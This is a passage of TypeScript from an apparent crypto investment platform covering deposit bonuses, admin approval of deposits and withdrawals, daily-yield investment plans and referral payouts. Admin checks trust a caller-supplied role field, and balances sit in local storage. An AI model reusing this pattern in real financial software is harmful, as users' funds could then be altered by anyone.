      targetUser.hasReceivedFirstDepositBonus = true;

      // Record separate bonus transaction for audit
      const bonusTx: Transaction = {
        id: `TX-${Math.floor(100000 + Math.random() * 900000)}`,
        userId: targetUser.userId,
        type: 'FIRST_DEPOSIT_BONUS',
        amount: bonusAmount,
        currency: 'USD',
        status: 'COMPLETED',
        timestamp: new Date().toISOString(),
        processedAt: new Date().toISOString(),
        note: `First Deposit Bonus (${bonusPercent}% of $${targetTx.amount.toFixed(2)})`
      };
      txs.unshift(bonusTx);
    }
  }

  users[uIdx] = targetUser;
  saveUsers(users);
  saveTransactions(txs);

  const currentSession = getCurrentSession();
  if (currentSession?.userId === targetUser.userId) {
    saveCurrentSession(targetUser);
  }

  const logs = getAuditLogs();
  logs.unshift({
    id: `AUDIT-${Math.floor(10000 + Math.random() * 90000)}`,
    adminId: adminUser.userId,
    action: 'DEPOSIT_APPROVED',
    targetUserId: targetUser.userId,
    targetUsername: targetUser.username,
    transactionId: targetTx.id,
    previousValue: `$${oldBalance.toFixed(2)}`,
    newValue: `$${targetUser.balance.toFixed(2)}`,
    timestamp: new Date().toISOString()
  });
  saveAuditLogs(logs);

  return { user: targetUser, tx: targetTx };
}

export function rejectDepositTransaction(adminUser: User, transactionId: string, reason?: string): Transaction {
  if (adminUser.role !== 'ADMIN') {
    throw new Error('UNAUTHORIZED: Admin privileges required.');
  }

  const txs = getTransactionsLocal();
  const txIdx = txs.findIndex((t) => t.id === transactionId);

  if (txIdx === -1) {
    throw new Error('Transaction not found.');
  }

  const targetTx = txs[txIdx];

  if (targetTx.status !== 'PENDING') {
    throw new Error(`TRANSACTION TERMINAL: Transaction ${transactionId} is already ${targetTx.status}.`);
  }

  targetTx.status = 'REJECTED';
  targetTx.processedAt = new Date().toISOString();
  targetTx.note = `Deposit ${targetTx.id} cancelled.`;
  txs[txIdx] = targetTx;
  saveTransactions(txs);

  const logs = getAuditLogs();
  logs.unshift({
    id: `AUDIT-${Math.floor(10000 + Math.random() * 90000)}`,
    adminId: adminUser.userId,
    action: 'DEPOSIT_REJECTED',
    targetUserId: targetTx.userId,
    targetUsername: targetTx.userId,
    transactionId: targetTx.id,
    reason: reason || 'Cancelled',
    timestamp: new Date().toISOString()
  });
  saveAuditLogs(logs);

  return targetTx;
}

export function cancelDepositTransaction(adminUser: User, transactionId: string): Transaction {
  return rejectDepositTransaction(adminUser, transactionId, 'Cancelled');
}

export function submitWithdrawalRequest(
  user: User,
  amount: number,
  currency: string,
  destinationAddress: string,
  destinationNetwork: string,
  investmentId?: string
): Transaction {
  if (amount <= 0) {
    throw new Error('Withdrawal amount must be greater than zero.');
  }

  const users = getUsersLocal();
  const uIdx = users.findIndex((u) => u.userId === user.userId);
  if (uIdx === -1) {
    throw new Error('User account not found.');
  }

  const targetUser = users[uIdx];
  if (targetUser.balance < amount && !investmentId) {
    throw new Error(`Insufficient funds. Available balance: $${targetUser.balance.toFixed(2)}.`);
  }

  if (!investmentId) {
    // Deduct withdrawal amount upfront for normal withdrawals
    targetUser.balance -= amount;
    users[uIdx] = targetUser;
    saveUsers(users);
  }

  const txId = `TX-${Math.floor(100000 + Math.random() * 900000)}`;
  const newTx: Transaction = {
    id: txId,
    userId: user.userId,
    type: 'WITHDRAWAL',
    amount: amount,
    currency: currency,
    status: 'PENDING',
    timestamp: new Date().toISOString(),
    note: `Withdrawal request #${txId} of $${amount.toFixed(2)} submitted! Status: PENDING`
  };

  const txs = getTransactionsLocal();
  txs.unshift(newTx);
  saveTransactions(txs);

  saveCurrentSession(targetUser);
  return newTx;
}

export function approveWithdrawalTransaction(adminUser: User, transactionId: string): { user: User; tx: Transaction } {
  if (adminUser.role !== 'ADMIN') {
    throw new Error('UNAUTHORIZED: Admin privileges required.');
  }

  const txs = getTransactionsLocal();
  const txIdx = txs.findIndex((t) => t.id === transactionId);

  if (txIdx === -1) {
    throw new Error('Transaction not found.');
  }

  const targetTx = txs[txIdx];
  if (targetTx.status !== 'PENDING') {
    throw new Error(`TRANSACTION TERMINAL: Transaction ${transactionId} is already ${targetTx.status}.`);
  }

  targetTx.status = 'APPROVED';
  targetTx.processedAt = new Date().toISOString();
  targetTx.note = `Withdrawal ${targetTx.id} approved and processed!`;
  txs[txIdx] = targetTx;
  saveTransactions(txs);

  const users = getUsersLocal();
  const targetUser = users.find((u) => u.userId === targetTx.userId) || { ...adminUser };

  const logs = getAuditLogs();
  logs.unshift({
    id: `AUDIT-${Math.floor(10000 + Math.random() * 90000)}`,
    adminId: adminUser.userId,
    action: 'WITHDRAWAL_APPROVED',
    targetUserId: targetTx.userId,
    targetUsername: targetUser.username || targetTx.userId,
    transactionId: targetTx.id,
    timestamp: new Date().toISOString()
  });
  saveAuditLogs(logs);

  return { user: targetUser, tx: targetTx };
}

export function cancelWithdrawalTransaction(adminUser: User, transactionId: string, reason?: string): { user: User; tx: Transaction } {
  if (adminUser.role !== 'ADMIN') {
    throw new Error('UNAUTHORIZED: Admin privileges required.');
  }

  const txs = getTransactionsLocal();
  const txIdx = txs.findIndex((t) => t.id === transactionId);

  if (txIdx === -1) {
    throw new Error('Transaction not found.');
  }

  const targetTx = txs[txIdx];
  if (targetTx.status !== 'PENDING') {
    throw new Error(`TRANSACTION TERMINAL: Transaction ${transactionId} is already ${targetTx.status}.`);
  }

  targetTx.status = 'REJECTED';
  targetTx.processedAt = new Date().toISOString();
  targetTx.note = `Withdrawal ${targetTx.id} cancelled. Principal refunded.`;
  txs[txIdx] = targetTx;

  const users = getUsersLocal();
  const uIdx = users.findIndex((u) => u.userId === targetTx.userId);
  let targetUser = users[uIdx];

  if (uIdx !== -1) {
    targetUser.balance += targetTx.amount;
    users[uIdx] = targetUser;
    saveUsers(users);

    const currentSession = getCurrentSession();
    if (currentSession?.userId === targetUser.userId) {
      saveCurrentSession(targetUser);
    }
  }

  saveTransactions(txs);

  const logs = getAuditLogs();
  logs.unshift({
    id: `AUDIT-${Math.floor(10000 + Math.random() * 90000)}`,
    adminId: adminUser.userId,
    action: 'WITHDRAWAL_REJECTED',
    targetUserId: targetTx.userId,
    targetUsername: targetUser ? targetUser.username : targetTx.userId,
    transactionId: targetTx.id,
    reason: reason || 'Cancelled',
    timestamp: new Date().toISOString()
  });
  saveAuditLogs(logs);

  return { user: targetUser || adminUser, tx: targetTx };
}

export function subscribeInvestmentPlan(user: User, planId: string, amount: number): { user: User; investment: UserInvestment } {
  if (amount <= 0) {
    throw new Error('Investment amount must be greater than zero.');
  }

  const plans = getPlans();
  const plan = plans.find((p) => p.id === planId);
  if (!plan) {
    throw new Error('Selected investment plan not found.');
  }

  if (amount < plan.minDeposit || amount > plan.maxDeposit) {
    throw new Error(`Amount must be between $${plan.minDeposit} and $${plan.maxDeposit} for ${plan.name}.`);
  }

  const users = getUsersLocal();
  const uIdx = users.findIndex((u) => u.userId === user.userId);
  if (uIdx === -1) {
    throw new Error('User account not found.');
  }

  const targetUser = users[uIdx];
  if (targetUser.balance < amount) {
    throw new Error(`Insufficient funds. Your balance is $${targetUser.balance.toFixed(2)}.`);
  }

  targetUser.balance -= amount;
  targetUser.totalInvestments += amount;
  users[uIdx] = targetUser;
  saveUsers(users);

  const dailyReturn = (amount * (plan.dailyYield / 100));
  const newInv: UserInvestment = {
    id: `INV-${Math.floor(100000 + Math.random() * 900000)}`,
    userId: user.userId,
    planId: plan.id,
    planName: plan.name,
    asset: plan.asset,
    amount: amount,
    dailyReturn: dailyReturn,
    startDate: new Date().toISOString(),
    durationDays: plan.lockDays,
    status: 'ACTIVE'
  };

  const invs = getInvestmentsLocal();
  invs.unshift(newInv);
  saveInvestments(invs);

  const txs = getTransactionsLocal();
  txs.unshift({
    id: `TX-${Math.floor(100000 + Math.random() * 900000)}`,
    userId: user.userId,
    type: 'YIELD',
    amount: amount,
    currency: plan.asset,
    status: 'COMPLETED',
    timestamp: new Date().toISOString(),
    processedAt: new Date().toISOString(),
    note: `Subscribed to ${plan.name} ($${amount.toFixed(2)})`
  });
  saveTransactions(txs);

  saveCurrentSession(targetUser);
  return { user: targetUser, investment: newInv };
}

export function withdrawReferralEarnings(user: User, amount: number): User {
  if (amount <= 0) {
    throw new Error('Amount must be greater than zero.');
  }

  const users = getUsersLocal();
  const uIdx = users.findIndex((u) => u.userId === user.userId);
  if (uIdx === -1) {
    throw new Error('User account not found.');
  }

  const targetUser = users[uIdx];
  if (targetUser.referralEarnings < amount) {
    throw new Error(`Insufficient referral earnings. Available: $${targetUser.referralEarnings.toFixed(2)}.`);
  }

  targetUser.referralEarnings -= amount;
  targetUser.balance += amount;
  users[uIdx] = targetUser;
  saveUsers(users);

  const txs = getTransactionsLocal();
  txs.unshift({
    id: `TX-${Math.floor(100000 + Math.random() * 900000)}`,
    userId: user.userId,
    type: 'REFERRAL_REWARD',
    amount: amount,
    currency: 'USD',
    status: 'COMPLETED',
    timestamp: new Date().toISOString(),
    processedAt: new Date().toISOString(),
    note: `Transferred $${amount.toFixed(2)} Referral Earnings to Main Balance`
  });
  saveTransactions(txs);

  saveCurrentSession(targetUser);
  return targetUser;
}
